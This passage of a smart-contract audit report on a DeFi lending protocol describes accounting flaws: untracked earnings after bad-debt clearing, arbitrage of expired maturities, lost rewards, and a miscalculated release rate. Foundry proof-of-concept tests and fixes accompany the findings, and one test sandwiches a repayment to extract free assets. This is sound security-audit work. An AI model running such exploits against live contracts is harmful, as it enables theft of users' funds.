In the `market`, all `funds` should be tracked accurately, whether they are currently held, `borrowed` by `borrowers`, or repaid in the future.
To ensure this, the `market` has a sophisticated tracking system that functions effectively.
However, when bad debts are cleared, there will be some untracked funds in the market.
## Vulnerability Detail
Users have the option to deposit into the `market` directly or into specific `fixed rate pools`.
When `borrowers` `borrow` funds from the `fixed rate pool`, they are backed by the `fixed deposits` first.
If there is a shortfall in funds, the remaining `debt` is supported by `floating assets`.
The movement of funds between `fixed borrowers` and `fixed depositors` is straightforward outside of the `tracking system`.
The `tracking system` within the `market` primarily monitors funds within the `variable pool` itself.
To simplify the scenario, let's assume there are no `fixed depositors` involved.

First, there are `extraordinary earnings`, including `variable backup fees`, `late fixed repayment penalties`, etc.
The `earnings accumulator` is responsible for collecting these earnings from `extraordinary` sources and subsequently distributing them gradually and smoothly.
For this purpose, there is a `earningsAccumulator` variable.
```solidity
function depositAtMaturity(
  uint256 maturity,
  uint256 assets,
  uint256 minAssetsRequired,
  address receiver
) external whenNotPaused whenNotFrozen returns (uint256 positionAssets) {
    earningsAccumulator += backupFee;
}
```
When users deposit funds into the `variable pool`, the `floatingAssets` increase by the deposited amounts as well as any additional earnings from the `earnings accumulator`.
```solidity
function afterDeposit(uint256 assets, uint256) internal override whenNotPaused whenNotFrozen {
  updateFloatingAssetsAverage();
  uint256 treasuryFee = updateFloatingDebt();
  uint256 earnings = accrueAccumulatedEarnings();  // @audit, here
  floatingAssets += earnings + assets;  // @audit, here
  depositToTreasury(treasuryFee);
  emitMarketUpdate();
}
```
Funds borrowed by `variable rate borrowers` are tracked using the `floatingDebt` variable, while funds borrowed by `fixed rate borrowers` are tracked using the `floatingBackupBorrowed` variable.
Additionally, there is an `unassignedEarnings` variable for each `maturity pool`, which represents upcoming `fees` from `borrowers`.
These earnings are added to the `floatingAssets` whenever there are changes in the `market`, such as `borrowers` repaying their `debt` , depositors withdrawing their funds etc.
```solidity
function depositAtMaturity(
  uint256 maturity,
  uint256 assets,
  uint256 minAssetsRequired,
  address receiver
) external whenNotPaused whenNotFrozen returns (uint256 positionAssets) {
  uint256 backupEarnings = pool.accrueEarnings(maturity); // @audit, here
  floatingAssets += backupEarnings;
}
```
While this variable is important, it is not directly involved in the `tracking system`.

Let's describe the vulnerability.
A user deposits `5 DAI` into the `DAI market`.
When clearing the `bad debt`, the amount is deducted from the `earnings accumulator`.
```solidity
function clearBadDebt(address borrower) external {
  if (totalBadDebt != 0) {
    earningsAccumulator -= totalBadDebt;  // @audit, here
    emit SpreadBadDebt(borrower, totalBadDebt);
  }
}
```
For testing purpose, `ALICE` borrows funds at a `fixed rate` and repays them after maturity, and the `penalty fee` from this is added to the `earnings accumulator`.
```solidity
function noTransferRepayAtMaturity(
  uint256 maturity,
  uint256 positionAssets,
  uint256 maxAssets,
  address borrower,
  bool canDiscount
) internal returns (uint256 actualRepayAssets) {
  if (block.timestamp < maturity) {
    if (canDiscount) {
      ...
    } else {
      actualRepayAssets = debtCovered;
    }
  } else {
    actualRepayAssets = debtCovered + debtCovered.mulWadDown((block.timestamp - maturity) * penaltyRate);

    // all penalties go to the earnings accumulator
    earningsAccumulator += actualRepayAssets - debtCovered;  // @audit, here
  }
}
```
Consequently, the `DAI market` has enough `earningsAccumulator` for clearing upcoming `bad debt` in the test. (see below log)
```solidity
earningsAccumulator before clear bad debt       ==>   112859178081957033645
```
Now this user `borrows` `1 DAI` from the `DAI market` at a specific `maturity`.
At this point, there is no `bad debt` in the `market` and the current `tracking values` are as follows:
```solidity
floatingAssets before clear bad debt            ==>   5005767123287671232800
floatingDebt before clear bad debt              ==>   0
floatingBackupBorrowed before clear bad debt    ==>   1000000000000000000
earningsAccumulator before clear bad debt       ==>   112859178081957033645
owed weth balance before clear bad debt         ==>   1000000000000000000 7671232876712328
calculated dai balance before clear bad debt    ==>   5117626301369628266445
dai balance before clear bad debt               ==>   5117626301369628266445
```
The current `DAI balance` is equal to `floatingAssets - floatingDebt - floatingBackupBorrowed + earningsAccumulator`.
Everything is correct.

Now, consider `1 DAI` equals to `5000 WETH`.
Given sufficient `collateral`, this user can `borrow` `5000 WEHT` from the `WETH market`.
If the price of `DAI` drops to `1000 WETH`, this user can be `liquidated`.

When `borrowers` `borrow` `fixed rate funds`, the `principal` is backed by `floating assets`(assuming no `fixed rate depositors`), and the `fee` is added to the `unassignedEarnings` of that `maturity pool`.
```solidity
function borrowAtMaturity(
  uint256 maturity,
  uint256 assets,
  uint256 maxAssets,
  address receiver,
  address borrower
) external whenNotPaused whenNotFrozen returns (uint256 assetsOwed) {
  {
    uint256 backupDebtAddition = pool.borrow(assets);  // @audit, here
    if (backupDebtAddition != 0) {
      uint256 newFloatingBackupBorrowed = floatingBackupBorrowed + backupDebtAddition;
      depositToTreasury(updateFloatingDebt());
      if (newFloatingBackupBorrowed + floatingDebt > floatingAssets.mulWadDown(1e18 - reserveFactor)) {
        revert InsufficientProtocolLiquidity();
      }
      floatingBackupBorrowed = newFloatingBackupBorrowed; // @audit, here
    }
  }

  {
    // if account doesn't have a current position, add it to the list
    FixedLib.Position storage position = fixedBorrowPositions[maturity][borrower];
    if (position.principal == 0) {
      Account storage account = accounts[borrower];
      account.fixedBorrows = account.fixedBorrows.setMaturity(maturity);
    }

    // calculate what portion of the fees are to be accrued and what portion goes to earnings accumulator
    (uint256 newUnassignedEarnings, uint256 newBackupEarnings) = pool.distributeEarnings(
      chargeTreasuryFee(fee),
      assets
    );
    if (newUnassignedEarnings != 0) pool.unassignedEarnings += newUnassignedEarnings;  // @audit, here
    collectFreeLunch(newBackupEarnings);

    fixedBorrowPositions[maturity][borrower] = FixedLib.Position(position.principal + assets, position.fee + fee);
  }
}
```
These `unassignedEarnings` are later added to the `floatingAssets` whenever changes occur in the `pool`.
However, when clearing `bad debt`, the sum of `principal` and `fee` is deducted from the `earningsAccumulator` if it's enough to cover the `bad debt`.
The `floatingBackupBorrowed` is reduced as `principal` (means that these funds returns to the `variable pool`), but there is no provision for the `fee`.
```solidity
function clearBadDebt(address borrower) external {
  while (packedMaturities != 0) {
    if (packedMaturities & 1 != 0) {
      FixedLib.Position storage position = fixedBorrowPositions[maturity][borrower];
      uint256 badDebt = position.principal + position.fee; // @audit, here
      ...
      floatingBackupBorrowed -= fixedPools[maturity].repay(position.principal); // @audit, here
    }
    packedMaturities >>= 1;
    maturity += FixedLib.INTERVAL;
  }
  if (totalBadDebt != 0) {
    earningsAccumulator -= totalBadDebt; // @audit, here
    emit SpreadBadDebt(borrower, totalBadDebt);
  }
  emitMarketUpdate();
}
```
In reality, the `fee` is reflected in the `unassignedEarnings` of that `maturity pool`, requiring an appropriate mechanism to update these `unassignedEarnings`.
If this user is the last user of this `maturity pool`, there is no way to convert these `unassignedEarnings` to the `tracking system`.
Consequently, funds equal to the `unassignedEarnings` remain untracked and unused.
Or if this user is not the last user of this `maturity pool`, these untracked `unassignedEarnings` can be allocated to late `fixed depositors`.
Below are tracking states in the `DAI market` after `liquidation`:
```solidity
floatingAssets after clear bad debt             ==>   5057139572755893855767
floatingDebt after clear bad debt               ==>   0
floatingBackupBorrowed after clear bad debt     ==>   0
earningsAccumulator after clear bad debt        ==>   55421917808101804495
owed weth balance after clear bad debt          ==>   0 0
calculated dai balance after clear bad debt     ==>   5112561490563995660262
dai balance after clear bad debt                ==>   5112569161796872372590
***************
difference          ==>   7671232876712328
cleared fee         ==>   7671232876712328
unassignedEarnings  ==>   7671232876712328
```
The difference between the actual `DAI balance` and `tracked balance` is equal to the `unassignedEarnings`.

Please add below test to the `Market.t.sol`.
```solidity
function testClearBadDebtBeforeMaturity() external {
  market.deposit(5 ether, address(this));
  market.deposit(5_000 ether, ALICE);
  marketWETH.deposit(100_000 ether, ALICE);

  uint256 maxVal = type(uint256).max;
  vm.prank(ALICE);
  market.borrowAtMaturity(4 weeks, 1_00 ether, maxVal, ALICE, ALICE);

  vm.warp(12 weeks);
  market.repayAtMaturity(4 weeks, maxVal, maxVal, ALICE);

  uint256 maturity_16 = 16 weeks;
  market.borrowAtMaturity(maturity_16, 1 ether, maxVal, address(this), address(this));
  (uint256 principal_before, uint256 fee_before) = market.fixedBorrowPositions(maturity_16, address(this));
  uint256 calculatedBalanceBefore = market.floatingAssets() - market.floatingDebt() - market.floatingBackupBorrowed() + market.earningsAccumulator();

  console2.log("floatingAssets before clear bad debt            ==>  ", market.floatingAssets());
  console2.log("floatingDebt before clear bad debt              ==>  ", market.floatingDebt());
  console2.log("floatingBackupBorrowed before clear bad debt    ==>  ", market.floatingBackupBorrowed());
  console2.log("earningsAccumulator before clear bad debt       ==>  ", market.earningsAccumulator());
  console2.log("owed weth balance before clear bad debt         ==>  ", principal_before, fee_before);
  console2.log("calculated dai balance before clear bad debt    ==>  ", calculatedBalanceBefore);
  console2.log("dai balance before clear bad debt               ==>  ", asset.balanceOf(address(market)));

  
  daiPriceFeed.setPrice(5_000e18);
  uint256 borrowAmount = 5000 ether;
  marketWETH.borrowAtMaturity(maturity_16, borrowAmount, borrowAmount * 2, address(this), address(this));

  daiPriceFeed.setPrice(1_000e18);
  weth.mint(ALICE, 1_000_000 ether);
  vm.prank(ALICE);
  weth.approve(address(marketWETH), maxVal);

  vm.prank(ALICE);
  marketWETH.liquidate(address(this), maxVal, market);

  (uint256 principal_after, uint256 fee_after) = market.fixedBorrowPositions(maturity_16, address(this));
  uint256 calculatedBalanceafter = market.floatingAssets() - market.floatingDebt() - market.floatingBackupBorrowed() + market.earningsAccumulator();

  console2.log("***************");
  console2.log("floatingAssets after clear bad debt             ==>  ", market.floatingAssets());
  console2.log("floatingDebt after clear bad debt               ==>  ", market.floatingDebt());
  console2.log("floatingBackupBorrowed after clear bad debt     ==>  ", market.floatingBackupBorrowed());
  console2.log("earningsAccumulator after clear bad debt        ==>  ", market.earningsAccumulator());
  console2.log("owed weth balance after clear bad debt          ==>  ", principal_after, fee_after);
  console2.log("calculated dai balance after clear bad debt     ==>  ", calculatedBalanceafter);
  console2.log("dai balance after clear bad debt                ==>  ", asset.balanceOf(address(market)));


  (, , uint256 unassignedEarnings_after, ) = market.fixedPools(maturity_16);
  console2.log("***************");
  console2.log("difference          ==>  ", asset.balanceOf(address(market)) - calculatedBalanceafter);
  console2.log("cleared fee         ==>  ", fee_before);
  console2.log("unassignedEarnings  ==>  ", unassignedEarnings_after);
}
```
## Impact
This vulnerability can happen under normal situation and there should be no untracked funds in the `market`.
Nobody will detect these untracked funds and they won't be used.
## Code Snippet
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/8f6ef1b0868d3ea3a98a5ab7e8b3a164857681d7/protocol/contracts/Market.sol#L253
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/8f6ef1b0868d3ea3a98a5ab7e8b3a164857681d7/protocol/contracts/Market.sol#L714
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/8f6ef1b0868d3ea3a98a5ab7e8b3a164857681d7/protocol/contracts/Market.sol#L244-L245
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/8f6ef1b0868d3ea3a98a5ab7e8b3a164857681d7/protocol/contracts/Market.sol#L652-L655
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/8f6ef1b0868d3ea3a98a5ab7e8b3a164857681d7/protocol/contracts/Market.sol#L514
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/8f6ef1b0868d3ea3a98a5ab7e8b3a164857681d7/protocol/contracts/Market.sol#L299-L306
## Tool used

Manual Review

## Recommendation
```solidity
function clearBadDebt(address borrower) external {
  if (msg.sender != address(auditor)) revert NotAuditor();

  floatingAssets += accrueAccumulatedEarnings();
  Account storage account = accounts[borrower];
  uint256 accumulator = earningsAccumulator;
  uint256 totalBadDebt = 0;
  uint256 packedMaturities = account.fixedBorrows;
  uint256 maturity = packedMaturities & ((1 << 32) - 1);
  packedMaturities = packedMaturities >> 32;
  while (packedMaturities != 0) {
    if (packedMaturities & 1 != 0) {
      FixedLib.Position storage position = fixedBorrowPositions[maturity][borrower];
      uint256 badDebt = position.principal + position.fee;
      if (accumulator >= badDebt) {
        RewardsController memRewardsController = rewardsController;
        if (address(memRewardsController) != address(0)) memRewardsController.handleBorrow(borrower);
        accumulator -= badDebt;
        totalBadDebt += badDebt;
        floatingBackupBorrowed -= fixedPools[maturity].repay(position.principal);
        delete fixedBorrowPositions[maturity][borrower];
        account.fixedBorrows = account.fixedBorrows.clearMaturity(maturity);

        emit RepayAtMaturity(maturity, msg.sender, borrower, badDebt, badDebt);

+        if (fixedPools[maturity].borrowed == position.principal) {
+          earningsAccumulator += fixedPools[maturity].unassignedEarnings;
+          fixedPools[maturity].unassignedEarnings = 0;
+        }
      }
    }
    packedMaturities >>= 1;
    maturity += FixedLib.INTERVAL;
  }
  if (account.floatingBorrowShares != 0 && (accumulator = previewRepay(accumulator)) != 0) {
    (uint256 badDebt, ) = noTransferRefund(accumulator, borrower);
    totalBadDebt += badDebt;
  }
  if (totalBadDebt != 0) {
    earningsAccumulator -= totalBadDebt;
    emit SpreadBadDebt(borrower, totalBadDebt);
  }
  emitMarketUpdate();
}
```
Or we need more sophisticated solution.

# Issue M-10: Expired maturities longer than `FixedLib.INTERVAL` with unaccrued earnings may be arbitraged and/or might lead to significant bad debt creation 

Source: https://github.com/sherlock-audit/2024-04-interest-rate-model-judging/issues/158 

## Found by 
0x73696d616f, BowTiedOriole, Emmanuel, Trumpero, elhaj
## Summary

`Market::totalAssets()` only accounts for the unassigned earnings of maturities that are in the future or during the past interval. Thus, if a maturity is repaid which was due more than 1 `INTERVAL`, `totalAssets()` will not account for it. This will impact users due to arbitrage and create bad debt during liquidations as collateral will be leftover, making it impossible to clean the bad debt.

## Vulnerability Detail

`Market::totalAssets()` includes the unassigned earnings up to `block.timestamp - (block.timestamp % FixedLib.INTERVAL);`, disregarding past maturities.

`Market::repayAtMaturity()` will convert into `floatingAssets` the past unassigned earnings, no matter how late the repayment is.

This discrepancy allows attackers to arbitrage the `Market` with minimal exposure (by sandwiching) the repayment.

Possible worse, it will lead to a lot of bad debt creation, as liquidations preview the `seizeAvailable` of a liquidatee in `Auditor::checkLiquidation()`, but the actual collateral balance of the user will be bigger due to the unaccrued earnings being converted to `floatingAssets`.

The following 2 POCs demonstrate both scenarios, add the tests to `Market.t.sol`:
```solidity
function test_POC_expired_maturities_LeftoverCollateral() external {
  uint256 maturity = FixedLib.INTERVAL * 2;
  uint256 assets = 10_000 ether;
  ERC20 asset = market.asset();
  deal(address(asset), ALICE, 2*assets);

  // ALICE deposits and borrows at maturity
  vm.startPrank(ALICE);
  market.deposit(assets, ALICE);
  market.borrowAtMaturity(maturity, assets*78*78/100/100, type(uint256).max, ALICE, ALICE);
  vm.stopPrank();

  skip(2*maturity);

  // BOB deposits just to clear earnings accumulator and floating debt,
  // which would impact calculations. The discrepancy in totalAssets()
  // will be only due to floatingAssets increase by repaying maturities
  // It also deposits collateral to pay the liquidator
  vm.prank(BOB);
  market.deposit(assets, BOB);

  // ALICE has more debt than collateral, so all collateral should be seized
  (uint256 aliceAssets, uint256 aliceDebt) = market.accountSnapshot(ALICE);
  assertGt(aliceDebt, aliceAssets);

  address liquidator = makeAddr("liquidator");
  deal(address(asset), liquidator, 100_000 ether);
  vm.startPrank(liquidator);
  asset.approve(address(market), type(uint256).max);
  market.liquidate(ALICE, type(uint256).max, market);
  vm.stopPrank();

  // ALICE has leftover shares due to the floating assets increase
  // when paying the due maturity, so some debt will never be repaied
  (aliceAssets, aliceDebt) = market.accountSnapshot(ALICE);
  assertEq(aliceAssets, 46671780821917806592); // 46e18 assets
  assertEq(aliceDebt, 4005059259761449851306); // 4005e18 debt
}


function test_POC_expired_maturities_may_be_arbitraged() external {
  uint256 maturity = FixedLib.INTERVAL * 2;
  uint256 assets = 10_000 ether;
  ERC20 asset = market.asset();
  deal(address(asset), ALICE, 2*assets);

  // ALICE deposits and borrows at maturity
  vm.startPrank(ALICE);
  market.deposit(assets, ALICE);
  market.borrowAtMaturity(maturity, assets*78*78/100/100, type(uint256).max, ALICE, ALICE);
  vm.stopPrank();

  skip(maturity + FixedLib.INTERVAL + 1);

  // BOB frontruns ALICE's repayment
  vm.prank(BOB);
  uint256 bobShares = market.deposit(assets, BOB);

  // ALICE Repays, accruing the unassigned earnings to floating assets
  vm.prank(ALICE);
  market.repayAtMaturity(maturity, type(uint256).max, type(uint256).max, ALICE);

  // BOB got free assets
  assertEq(market.previewRedeem(bobShares), 10046671780821917806594);
}
```

## Impact

Risk free arbitrage by attackers and significant bad debt creation which may not be cleared on liquidations.

## Code Snippet

https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L478-L479
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L786
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L929-L941
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Auditor.sol#L219
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Auditor.sol#L248

## Tool used

Manual Review

Vscode

Foundry

## Recommendation

Convert the unaccrued earnings to `earningsAccumulator` instead of directly to floating assets. In `Market::totalAssets()`, remove the section of previewing unaccrued earnings, as they will go through the `earningsAccumulator` and can not be arbitraged.

# Issue M-11: Some rewards will be lost if no floating deposits exist in the market 

Source: https://github.com/sherlock-audit/2024-04-interest-rate-model-judging/issues/176 

## Found by 
Trumpero
## Summary
When no one deposits into the floating market, the reward could be lost.

## Vulnerability Detail
The `RewardsController` contract is tasked with distributing rewards to users who either deposit or borrow within the protocol. An interesting feature of this contract is the allocation module it employs, which decides how tokens are divided among different user classes (borrowers and depositors) in each period. This is determined by the settings configured for the distribution and is implemented through the `RewardsController.previewAllocation()` function.

```solidity=
  v.depositRewardRule =
    rewardData.depositAllocationWeightAddend.mulWadDown(1e18 - v.sigmoid) +
    rewardData.depositAllocationWeightFactor.mulWadDown(v.sigmoid);
  v.borrowAllocation = v.borrowRewardRule.divWadDown(v.borrowRewardRule + v.depositRewardRule);
  v.depositAllocation = 1e18 - v.borrowAllocation;
  {
    uint256 totalDepositSupply = market.totalSupply();
    uint256 totalBorrowSupply = market.totalFloatingBorrowShares() + m.fixedBorrowShares;
    uint256 baseUnit = distribution[market].baseUnit;
    borrowIndex =
      rewardData.borrowIndex +
      (totalBorrowSupply > 0 ? rewards.mulWadDown(v.borrowAllocation).mulDivDown(baseUnit, totalBorrowSupply) : 0);
    depositIndex =
      rewardData.depositIndex +
      (
        totalDepositSupply > 0
          ? rewards.mulWadDown(v.depositAllocation).mulDivDown(baseUnit, totalDepositSupply)
          : 0
      );
  }
```

After determining the rewards for both the borrowing and depositing sides of the market, the function begins to distribute these rewards by dividing the allocated rewards among the existing shares of the total borrow/deposit supply.

However, issues arise when the `totalBorrowSupply` or `totalDepositSupply` is zero. In such cases, the allocated rewards for that class are effectively lost since there are no shares to receive the rewards. As a result, the index for that class remains unmodified, and no reward accrual takes place for that class, leading to the loss of rewards within the contract.

Upon closer examination, I noticed that when `totalBorrowSupply == 0`, the calculated `target` at [line 500](https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/RewardsController.sol#L500) also becomes zero, leading to a `distributionFactor` of zero as calculated at [lines 507 - 509](https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/RewardsController.sol#L507-L509). Consequently, all undistributed rewards from that period are moved to `rewardData.lastUndistributed` and are later redistributed.

However, there is no similar mechanism to address scenarios where `totalDepositSupply == 0` and `totalBorrowSupply != 0`, potentially resulting in reward loss. Such a scenario can occur when users do not engage in the floating market but only participate in depositing and borrowing at specific maturities.

**Proof Of Concept**: 
* Place the test into `protocol/test/M3.t.sol`
* Run the command `forge test --match-test testIssueM3 -vv`

```solidity=
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.17;

import { Test } from "forge-std/Test.sol";
import { MockERC20 } from "solmate/src/test/utils/mocks/MockERC20.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { FixedPointMathLib } from "solmate/src/utils/FixedPointMathLib.sol";
import { MockInterestRateModel } from "../contracts/mocks/MockInterestRateModel.sol";
import { InterestRateModel } from "../contracts/InterestRateModel.sol";
import { Auditor, IPriceFeed } from "../contracts/Auditor.sol";
import { Market } from "../contracts/Market.sol";
import { MockPriceFeed } from "../contracts/mocks/MockPriceFeed.sol";
import { ERC20, RewardsController, ClaimPermit, InvalidConfig } from "../contracts/RewardsController.sol";
import { FixedLib } from "../contracts/utils/FixedLib.sol";
import "forge-std/console.sol";

contract M3 is Test {
  using FixedPointMathLib for uint256;
  using FixedPointMathLib for int256;

  address internal constant ALICE = address(0x420);
  address internal constant BOB = address(0x69);

  RewardsController internal rewardsController;
  Auditor internal auditor;
  Market internal marketUSDC;
  Market internal marketWETH;
  Market internal marketWBTC;
  MockERC20 internal opRewardAsset;
  MockERC20 internal exaRewardAsset;
  MockInterestRateModel internal irm;

  function setUp() external {
    vm.warp(0);
    MockERC20 usdc = new MockERC20("USD Coin", "USDC", 6);
    MockERC20 weth = new MockERC20("WETH", "WETH", 18);
    MockERC20 wbtc = new MockERC20("WBTC", "WBTC", 8);
    opRewardAsset = new MockERC20("OP", "OP", 18);
    exaRewardAsset = new MockERC20("Exa Reward", "EXA", 18);

    auditor = Auditor(address(new ERC1967Proxy(address(new Auditor(18)), "")));
    auditor.initialize(Auditor.LiquidationIncentive(0.09e18, 0.01e18));
    vm.label(address(auditor), "Auditor");
    irm = new MockInterestRateModel(0.1e18);

    marketUSDC = Market(address(new ERC1967Proxy(address(new Market(usdc, auditor)), "")));
    marketUSDC.initialize(
      "USDC.e",
      3,
      1e18,
      InterestRateModel(address(irm)),
      0.02e18 / uint256(1 days),
      1e17,
      0,
      0.0046e18,
      0.42e18
    );
    vm.label(address(marketUSDC), "MarketUSDC");
    auditor.enableMarket(marketUSDC, new MockPriceFeed(18, 1e18), 0.8e18);

    marketWETH = Market(address(new ERC1967Proxy(address(new Market(weth, auditor)), "")));
    marketWETH.initialize(
      "WETH",
      3,
      1e18,
      InterestRateModel(address(irm)),
      0.02e18 / uint256(1 days),
      1e17,
      0,
      0.0046e18,
      0.42e18
    );
    vm.label(address(marketWETH), "MarketWETH");
    auditor.enableMarket(marketWETH, IPriceFeed(auditor.BASE_FEED()), 0.9e18);

    marketWBTC = Market(address(new ERC1967Proxy(address(new Market(wbtc, auditor)), "")));
    marketWBTC.initialize(
      "WBTC",
      3,
      1e18,
      InterestRateModel(address(irm)),
      0.02e18 / uint256(1 days),
      1e17,
      0,
      0.0046e18,
      0.42e18
    );
    vm.label(address(marketWBTC), "MarketWBTC");
    auditor.enableMarket(marketWBTC, new MockPriceFeed(18, 20_000e18), 0.9e18);

    rewardsController = RewardsController(address(new ERC1967Proxy(address(new RewardsController()), "")));
    rewardsController.initialize();
    vm.label(address(rewardsController), "RewardsController");
    RewardsController.Config[] memory configs = new RewardsController.Config[](1);
    
    configs[0] = RewardsController.Config({
      market: marketWETH,
      reward: opRewardAsset,
      priceFeed: IPriceFeed(address(0)),
      targetDebt: 20_000e6,
      totalDistribution: 2_000 ether,
      start: uint32(block.timestamp),
      distributionPeriod: 12 weeks,
      undistributedFactor: 0.5e18,
      flipSpeed: 2e18,
      compensationFactor: 0.85e18,
      transitionFactor: 0.81e18,
      borrowAllocationWeightFactor: 0,
      depositAllocationWeightAddend: 0.02e18,
      depositAllocationWeightFactor: 0.01e18
    });

    rewardsController.config(configs);
    marketUSDC.setRewardsController(rewardsController);
    marketWETH.setRewardsController(rewardsController);
    opRewardAsset.mint(address(rewardsController), 4_000 ether);
    exaRewardAsset.mint(address(rewardsController), 4_000 ether);

    usdc.mint(address(this), 100 ether);
    usdc.mint(ALICE, 100 ether);
    usdc.mint(BOB, 100 ether);
    weth.mint(address(this), 50_000 ether);
    weth.mint(ALICE, 1_000 ether);
    wbtc.mint(address(this), 1_000e8);
    wbtc.mint(BOB, 1_000e8);
    usdc.approve(address(marketUSDC), type(uint256).max);
    weth.approve(address(marketWETH), type(uint256).max);
    wbtc.approve(address(marketWBTC), type(uint256).max);
    vm.prank(ALICE);
    usdc.approve(address(marketUSDC), type(uint256).max);
    vm.prank(ALICE);
    weth.approve(address(marketWETH), type(uint256).max);
    vm.prank(BOB);
    usdc.approve(address(marketUSDC), type(uint256).max);
    vm.prank(BOB);
    wbtc.approve(address(marketWBTC), type(uint256).max);
  }

  function testIssueM3() external {
    auditor.enterMarket(marketUSDC);

    /// 1. Alice deposits at maturity = FixedLib.INTERVAL
    marketWETH.depositAtMaturity(FixedLib.INTERVAL, 10e18, 10e18, ALICE);

    /// 2. I deposit USDC to marketUSDC as collateral to borrow WETH 
    marketUSDC.deposit(100_000e6, address(this));

    /// 3. I borrow WETH at maturity = FixedLib.INTERVAL 
    ///    use borrowAmount > targetDebt to make sure all reward will be distributed after the distribution conclude
    uint targetDebt = 20_000e6 + 1;
    marketWETH.borrowAtMaturity(FixedLib.INTERVAL, targetDebt, targetDebt * 2, address(this), address(this));

    /// 4. advance time to make the reward distributon conclude 
    (, uint256 distributionEnd, ) = rewardsController.distributionTime(marketWETH, opRewardAsset);
    assertEq(distributionEnd, block.timestamp + 12 weeks);
    vm.warp(distributionEnd + 1000 weeks);

    /// recalculate the actual total distribution (due to truncate)
    uint totalDistribution = 2_000 ether;
    uint distributionPeriod = 12 weeks;
    uint releaseRate = totalDistribution / distributionPeriod;
    uint actualTotalDistribution = releaseRate * distributionPeriod; 
    
    /// 5. I claim rewards 
    (, uint256[] memory claimedAmounts) = rewardsController.claimAll(address(this));
    console.log(claimedAmounts[0]);
    console.log(actualTotalDistribution);
    assertLt(claimedAmounts[0], actualTotalDistribution);
  }
}

```

## Impact
Rewards designated for the deposit class will be lost when `totalDepositSupply` equals zero.

## Code Snippet
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/RewardsController.sol#L576-L592

## Tool used
Manual Review

## Recommendation
Consider adding the allocated rewards for the depositors to the `rewardData.lastUndistributed` if the `totalDepositSupply == 0` and `totalBorrowSupply != 0`

# Issue M-12: `rewardData.releaseRate` is incorrectly calculated on `RewardsController::config()` when `block.timestamp > start` and `rewardData.lastConfig != rewardData.start` 

Source: https://github.com/sherlock-audit/2024-04-interest-rate-model-judging/issues/245 

## Found by 
0x73696d616f, AllTooWell, Trumpero, ether\_sky
## Summary

Setting new parameters in `RewardsController::config()` will lead to lost rewards if `block.timestamp > start` and the `rewardData.start` was set in the future initially.

## Vulnerability Detail

When `RewardsController::config()` is called to update the data of a reward, as it was already set initially, it will go into the `else` branch. In here, it updates the `rewardRate` according to the previously distributed rewards, the total distribution and the distribution periods. More precisely, the calculation is:
```solidity
...
if (block.timestamp > start) {
  released =
    rewardData.lastConfigReleased +
    rewardData.releaseRate *
    (block.timestamp - rewardData.lastConfig);
  elapsed = block.timestamp - start;
  if (configs[i].totalDistribution <= released || configs[i].distributionPeriod <= elapsed) {
    revert InvalidConfig();
  }
  rewardData.lastConfigReleased = released;
}

rewardData.releaseRate =
  (configs[i].totalDistribution - released) /
  (configs[i].distributionPeriod - elapsed);
...
``` 
It calculates the release pro-rata to `block.timestamp - rewardData.lastConfig`, considering the time that the rewards have been emitted, but this is incorrect when `rewardData.start` was set in the future when creating the initial config. This will lead to the overestimation of released rewards, which will lower the `rewardData.releaseRate`, as it is pro-rata to `configs[i].totalDistribution - released`. Thus, less rewards will be distributed than expected.

## Impact

Lost of rewards for users that will receive less than supposed.

## Code Snippet

https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/RewardsController.sol#L681
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/RewardsController.sol#L699

## Tool used

Manual Review

Vscode

## Recommendation

The release rewards are `rewardData.releaseRate * (block.timestamp - rewardData.start);`.

